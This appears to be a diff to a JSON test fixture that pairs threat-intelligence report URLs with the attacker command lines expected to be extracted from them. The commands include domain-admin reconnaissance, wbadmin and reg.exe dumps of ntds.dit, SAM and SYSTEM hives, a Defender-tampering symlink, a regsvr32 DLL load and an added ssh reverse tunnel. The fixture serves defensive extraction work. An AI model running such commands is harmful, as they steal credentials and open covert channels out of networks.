@@ -51,7 +51,7 @@
       "nltest /dclist:",
       "net group \"Domain Admins\" /domain",
       "\"C:\\Program Files\\WinRAR\\WinRAR.exe\" a -ep1 -scul -r0 -iext -imon1 -- . F:\\Shares\\REDACTED\\REDACTED",
-      "\"C:\\Program Files\\WinRAR\\WinRAR.exe\" x -iext -ow -ver -imon1   \"F:\\Shares\\<redacted>\\<redacted>\\<redacted>.zip\" F:\\Shares\\<redacted>\\<redacted>\\<redacted>\\"
+      "\"C:\\Program Files\\WinRAR\\WinRAR.exe\" x -iext -ow -ver -imon1 – \"F:\\Shares\\<redacted>\\<redacted>\\<redacted>.zip\" F:\\Shares\\<redacted>\\<redacted>\\<redacted>\\"
     ]
   },
   {
@@ -70,13 +70,14 @@
       "whoami.exe /groups",
       "net.exe group \"domain admins\" /dom",
       "net.exe group \"enterprise admins\" /dom",
-      "wbadmin start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include:\"C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY\" -quiet"
+      "wbadmin start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include:\"C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY\" -quiet",
+      "ssh [email protected] -R *:10400 -p22"
     ]
   },
   {
     "url": "https://www.elastic.co/security-labs/roningloader",
     "expected_items": [
-      "mklink /D \"C:\\ProgramData\\roming\" \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0\"",
+      "mklink /D \"C:\\ProgramData\\roming\" “C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25050.5-0”",
       "regsvr32.exe /S \"C:\\ProgramData\\Roning\\goldendays.dll"
     ]
   },
@@ -103,7 +104,7 @@
       "echo 2W2GZqAg8k6ipgBTcHyK5wABDSW",
       "echo 9fW99pdqfpXU21zd",
       "whoami /all",
-      "reg.exe save HKLM\\SYSTEM \"C:\\Windows\\temp\\1\\sy.sa\" /y",
+      "reg.exe save HKLM\\SYSTEM “C:\\Windows\\temp\\1\\sy.sa” /y",
       "reg.exe save HKLM\\SAM",
       "chcp 65001 > NUL & netstat -afn -p TCP",
       "chcp 65001 > NUL & wmic datafile where Name=\"C:\\Windows\\system32\\ntoskrnl.exe\" get Version",
